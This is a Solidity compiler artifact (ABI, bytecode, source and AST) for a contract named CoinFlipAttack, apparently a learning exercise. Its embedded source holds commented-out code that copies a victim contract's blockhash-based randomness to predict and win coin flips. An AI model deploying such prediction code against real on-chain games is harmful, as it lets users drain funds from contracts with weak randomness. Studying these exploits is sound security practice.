{
  "contractName": "CoinFlipAttack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "side",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "consecutiveWins",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "victimContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "setVictim",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "metadata": "{\"compiler\":{\"version\":\"0.5.0+commit.1d4f565a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"constant\":false,\"inputs\":[{\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"setVictim\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"side\",\"outputs\":[{\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"victimContract\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"/C/dev/dapps/playground/contracts/CoinFlipAttack.sol\":\"CoinFlipAttack\"},\"evmVersion\":\"byzantium\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"/C/dev/dapps/playground/contracts/CoinFlip.sol\":{\"keccak256\":\"0x1a0845f1f16ffd5f129c245e1e0ec03ea3fead24ba8461465985ec87990ddb06\",\"urls\":[\"bzzr://ce83a58b72aeca5e5ef702fa123e4b8725770f04149a774581a4ec8afbf19256\"]},\"/C/dev/dapps/playground/contracts/CoinFlipAttack.sol\":{\"keccak256\":\"0x1ab8aba7835d2460f29e2fdfcffee39f51e03416b43a0210afaa385be0ad89c2\",\"urls\":[\"bzzr://4cd517d1a5089b4c3bd792010c71a8b9bdd067a9b38b9f600254ae8dcd3a3864\"]},\"/C/dev/dapps/playground/contracts/SafeMath.sol\":{\"keccak256\":\"0x424f4a0d1f01f63f2db8b79b49bc72de18c2d29eee5027985a87a3d36e543264\",\"urls\":[\"bzzr://73ae4bef73b3c871e46d34d6c8cabd0b7c7bd6b6552e41f2c4f6d197998cab3e\"]}},\"version\":1}",
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060035534801561003457600080fd5b506000808190555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506103098061008c6000396000f3fe60806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b439621146100725780638475c028146101035780638da5cb5b14610132578063e6f334d714610189578063f32d251d146101b4575b600080fd5b34801561007e57600080fd5b506100c16004803603602081101561009557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061020b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561010f57600080fd5b50610118610278565b604051808215151515815260200191505060405180910390f35b34801561013e57600080fd5b5061014761028b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561019557600080fd5b5061019e6102b1565b6040518082815260200191505060405180910390f35b3480156101c057600080fd5b506101c96102b7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b600081600460016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460019054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600460009054906101000a900460ff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60005481565b600460019054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea165627a7a723058209387037d90658d5103d56bc118e14d7d09a2f2898d0666014e5d3beb223a365e0029",
  "deployedBytecode": "0x60806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b439621146100725780638475c028146101035780638da5cb5b14610132578063e6f334d714610189578063f32d251d146101b4575b600080fd5b34801561007e57600080fd5b506100c16004803603602081101561009557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061020b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561010f57600080fd5b50610118610278565b604051808215151515815260200191505060405180910390f35b34801561013e57600080fd5b5061014761028b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561019557600080fd5b5061019e6102b1565b6040518082815260200191505060405180910390f35b3480156101c057600080fd5b506101c96102b7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b600081600460016101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600460019054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b600460009054906101000a900460ff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60005481565b600460019054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea165627a7a723058209387037d90658d5103d56bc118e14d7d09a2f2898d0666014e5d3beb223a365e0029",
  "sourceMap": "209:2333:1:-;;;421:77;404:94;;530:88;8:9:-1;5:2;;;30:1;27;20:12;5:2;530:88:1;580:1;562:15;:19;;;;600:10;592:5;;:18;;;;;;;;;;;;;;;;;;209:2333;;;;;;",
  "deployedSourceMap": "209:2333:1:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;924:420;;8:9:-1;5:2;;;30:1;27;20:12;5:2;924:420:1;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;924:420:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;505:16;;8:9:-1;5:2;;;30:1;27;20:12;5:2;505:16:1;;;;;;;;;;;;;;;;;;;;;;;;;;;310:20;;8:9:-1;5:2;;;30:1;27;20:12;5:2;310:20:1;;;;;;;;;;;;;;;;;;;;;;;;;;;273:30;;8:9:-1;5:2;;;30:1;27;20:12;5:2;273:30:1;;;;;;;;;;;;;;;;;;;;;;;626;;8:9:-1;5:2;;;30:1;27;20:12;5:2;626:30:1;;;;;;;;;;;;;;;;;;;;;;;;;;;924:420;974:7;1289:5;1263:14;;:32;;;;;;;;;;;;;;;;;;1321:14;;;;;;;;;;;1306:30;;924:420;;;:::o;505:16::-;;;;;;;;;;;;;:::o;310:20::-;;;;;;;;;;;;;:::o;273:30::-;;;;:::o;626:::-;;;;;;;;;;;;;:::o",
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.5.0;\r\n\r\n/*\r\nImport the vulnerable contract so we can later\r\ninstantiate it and call its functions\r\n*/\r\nimport \"./SafeMath.sol\";\r\nimport \"./CoinFlip.sol\";\r\n\r\ncontract CoinFlipAttack {\r\n    using SafeMath for uint256;\r\n    uint256 public consecutiveWins;\r\n    address public owner;\r\n    uint256 lastHash;\r\n    // Same number as in CoinFlip contract\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n    bool public side;\r\n\r\n    constructor() public {\r\n        consecutiveWins = 0;\r\n        owner = msg.sender;\r\n    }\r\n\r\n    CoinFlip public victimContract;\r\n\r\n    // constructor(address _addr) public {\r\n    //     victimContract = CoinFlip(_addr);\r\n    // }\r\n\r\n    /*\r\n    Public function to set the victim contract. We will call this first in our exploit.\r\n    It could have also been done in a constructor.\r\n    */\r\n    function setVictim(address _addr) public returns (address) {\r\n        /* \r\n        Note that here we are not calling CoinFlip constructor with an address,\r\n        but just instantiating it and setting its address. All functions calls will be sent to that address.\r\n        This is a Solidity quirk, get used to it :)\r\n        */\r\n        victimContract = CoinFlip(_addr);\r\n        return address(victimContract);\r\n    }\r\n\r\n    /*\r\n    Public function which mimics the PRNG in CoinFlip and then calls CoinFlip with the correct guess.\r\n    */\r\n    // function flip() public returns (bool) {\r\n    //     // Same PRNG as in victim contract\r\n    //     // The \"random\" numbers will be exactly the same in both contracts\r\n    //     uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n    //     uint256 coinFlip = blockValue.div(FACTOR);\r\n    //     side = coinFlip == 1 ? true : false;\r\n\r\n    //     // Here we call the victim contract flip function with our guess\r\n    //     return bool(victimContract.flip(side));\r\n    // }\r\n\r\n    // function testFlip(bool _guess) public returns (bool) {\r\n    //     uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n\r\n    //     if (lastHash == blockValue) {\r\n    //         revert();\r\n    //     }\r\n\r\n    //     lastHash = blockValue;\r\n    //     uint256 coinFlip = blockValue.div(FACTOR);\r\n    //     bool side = coinFlip == 1 ? true : false;\r\n\r\n    //     if (side == _guess) {\r\n    //         consecutiveWins++;\r\n    //         return true;\r\n    //     } else {\r\n    //         consecutiveWins = 0;\r\n    //         return false;\r\n    //     }\r\n    // }\r\n}\r\n",
  "sourcePath": "C:/dev/dapps/playground/contracts/CoinFlipAttack.sol",
  "ast": {
    "absolutePath": "/C/dev/dapps/playground/contracts/CoinFlipAttack.sol",
    "exportedSymbols": {
      "CoinFlipAttack": [
        138
      ]
    },
    "id": 139,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 88,
        "literals": [
          "solidity",
          "^",
          "0.5",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "33:23:1"
      },
      {
        "absolutePath": "/C/dev/dapps/playground/contracts/SafeMath.sol",
        "file": "./SafeMath.sol",
        "id": 89,
        "nodeType": "ImportDirective",
        "scope": 139,
        "sourceUnit": 363,
        "src": "155:24:1",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/C/dev/dapps/playground/contracts/CoinFlip.sol",
        "file": "./CoinFlip.sol",
        "id": 90,
        "nodeType": "ImportDirective",
        "scope": 139,
        "sourceUnit": 87,
        "src": "181:24:1",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 138,
        "linearizedBaseContracts": [
          138
        ],
        "name": "CoinFlipAttack",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "id": 93,
            "libraryName": {
              "contractScope": null,
              "id": 91,
              "name": "SafeMath",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 362,
              "src": "246:8:1",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_SafeMath_$362",
                "typeString": "library SafeMath"
              }
            },
            "nodeType": "UsingForDirective",
            "src": "240:27:1",
            "typeName": {
              "id": 92,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "259:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            }
          },
          {
            "constant": false,
            "id": 95,
            "name": "consecutiveWins",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "273:30:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 94,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "273:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 97,
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "310:20:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 96,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "310:7:1",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 99,
            "name": "lastHash",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "337:16:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 98,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "337:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 102,
            "name": "FACTOR",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "404:94:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 100,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "404:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": {
              "argumentTypes": null,
              "hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
              "id": 101,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "421:77:1",
              "subdenomination": null,
              "typeDescriptions": {
                "typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
                "typeString": "int_const 5789...(69 digits omitted)...9968"
              },
              "value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 104,
            "name": "side",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "505:16:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_bool",
              "typeString": "bool"
            },
            "typeName": {
              "id": 103,
              "name": "bool",
              "nodeType": "ElementaryTypeName",
              "src": "505:4:1",
              "typeDescriptions": {
                "typeIdentifier": "t_bool",
                "typeString": "bool"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 116,
              "nodeType": "Block",
              "src": "551:67:1",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 109,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 107,
                      "name": "consecutiveWins",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 95,
                      "src": "562:15:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "hexValue": "30",
                      "id": 108,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "580:1:1",
                      "subdenomination": null,
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_0_by_1",
                        "typeString": "int_const 0"
                      },
                      "value": "0"
                    },
                    "src": "562:19:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "id": 110,
                  "nodeType": "ExpressionStatement",
                  "src": "562:19:1"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 114,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 111,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 97,
                      "src": "592:5:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 112,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 400,
                        "src": "600:3:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 113,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "600:10:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "src": "592:18:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 115,
                  "nodeType": "ExpressionStatement",
                  "src": "592:18:1"
                }
              ]
            },
            "documentation": null,
            "id": 117,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 105,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "541:2:1"
            },
            "returnParameters": {
              "id": 106,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "551:0:1"
            },
            "scope": 138,
            "src": "530:88:1",
            "stateMutability": "nonpayable",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 119,
            "name": "victimContract",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "626:30:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_CoinFlip_$86",
              "typeString": "contract CoinFlip"
            },
            "typeName": {
              "contractScope": null,
              "id": 118,
              "name": "CoinFlip",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 86,
              "src": "626:8:1",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_CoinFlip_$86",
                "typeString": "contract CoinFlip"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 136,
              "nodeType": "Block",
              "src": "983:361:1",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 130,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 126,
                      "name": "victimContract",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 119,
                      "src": "1263:14:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CoinFlip_$86",
                        "typeString": "contract CoinFlip"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 128,
                          "name": "_addr",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 121,
                          "src": "1289:5:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 127,
                        "name": "CoinFlip",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 86,
                        "src": "1280:8:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_CoinFlip_$86_$",
                          "typeString": "type(contract CoinFlip)"
                        }
                      },
                      "id": 129,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1280:15:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_CoinFlip_$86",
                        "typeString": "contract CoinFlip"
                      }
                    },
                    "src": "1263:32:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_CoinFlip_$86",
                      "typeString": "contract CoinFlip"
                    }
                  },
                  "id": 131,
                  "nodeType": "ExpressionStatement",
                  "src": "1263:32:1"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "id": 133,
                        "name": "victimContract",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 119,
                        "src": "1321:14:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_CoinFlip_$86",
                          "typeString": "contract CoinFlip"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_contract$_CoinFlip_$86",
                          "typeString": "contract CoinFlip"
                        }
                      ],
                      "id": 132,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "nodeType": "ElementaryTypeNameExpression",
                      "src": "1313:7:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_type$_t_address_$",
                        "typeString": "type(address)"
                      },
                      "typeName": "address"
                    },
                    "id": 134,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "typeConversion",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1313:23:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "functionReturnParameters": 125,
                  "id": 135,
                  "nodeType": "Return",
                  "src": "1306:30:1"
                }
              ]
            },
            "documentation": null,
            "id": 137,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "setVictim",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 122,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 121,
                  "name": "_addr",
                  "nodeType": "VariableDeclaration",
                  "scope": 137,
                  "src": "943:13:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 120,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "943:7:1",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "942:15:1"
            },
            "returnParameters": {
              "id": 125,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 124,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 137,
                  "src": "974:7:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 123,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "974:7:1",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "973:9:1"
            },
            "scope": 138,
            "src": "924:420:1",
            "stateMutability": "nonpayable",
            "superFunction": null,
            "visibility": "public"
          }
        ],
        "scope": 139,
        "src": "209:2333:1"
      }
    ],
    "src": "33:2511:1"
  },
  "legacyAST": {
    "absolutePath": "/C/dev/dapps/playground/contracts/CoinFlipAttack.sol",
    "exportedSymbols": {
      "CoinFlipAttack": [
        138
      ]
    },
    "id": 139,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 88,
        "literals": [
          "solidity",
          "^",
          "0.5",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "33:23:1"
      },
      {
        "absolutePath": "/C/dev/dapps/playground/contracts/SafeMath.sol",
        "file": "./SafeMath.sol",
        "id": 89,
        "nodeType": "ImportDirective",
        "scope": 139,
        "sourceUnit": 363,
        "src": "155:24:1",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "absolutePath": "/C/dev/dapps/playground/contracts/CoinFlip.sol",
        "file": "./CoinFlip.sol",
        "id": 90,
        "nodeType": "ImportDirective",
        "scope": 139,
        "sourceUnit": 87,
        "src": "181:24:1",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 138,
        "linearizedBaseContracts": [
          138
        ],
        "name": "CoinFlipAttack",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "id": 93,
            "libraryName": {
              "contractScope": null,
              "id": 91,
              "name": "SafeMath",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 362,
              "src": "246:8:1",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_SafeMath_$362",
                "typeString": "library SafeMath"
              }
            },
            "nodeType": "UsingForDirective",
            "src": "240:27:1",
            "typeName": {
              "id": 92,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "259:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            }
          },
          {
            "constant": false,
            "id": 95,
            "name": "consecutiveWins",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "273:30:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 94,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "273:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 97,
            "name": "owner",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "310:20:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 96,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "310:7:1",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 99,
            "name": "lastHash",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "337:16:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 98,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "337:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 102,
            "name": "FACTOR",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "404:94:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint256",
              "typeString": "uint256"
            },
            "typeName": {
              "id": 100,
              "name": "uint256",
              "nodeType": "ElementaryTypeName",
              "src": "404:7:1",
              "typeDescriptions": {
                "typeIdentifier": "t_uint256",
                "typeString": "uint256"
              }
            },
            "value": {
              "argumentTypes": null,
              "hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
              "id": 101,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "421:77:1",
              "subdenomination": null,
              "typeDescriptions": {
                "typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
                "typeString": "int_const 5789...(69 digits omitted)...9968"
              },
              "value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 104,
            "name": "side",
            "nodeType": "VariableDeclaration",
            "scope": 138,
            "src": "505:16:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_bool",
              "typeString": "bool"
            },
            "typeName": {
              "id": 103,
              "name": "bool",
              "nodeType": "ElementaryTypeName",
              "src": "505:4:1",
              "typeDescriptions": {
                "typeIdentifier": "t_bool",
                "typeString": "bool"
              }
            },
            "value": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 116,
              "nodeType": "Block",
              "src": "551:67:1",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 109,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 107,
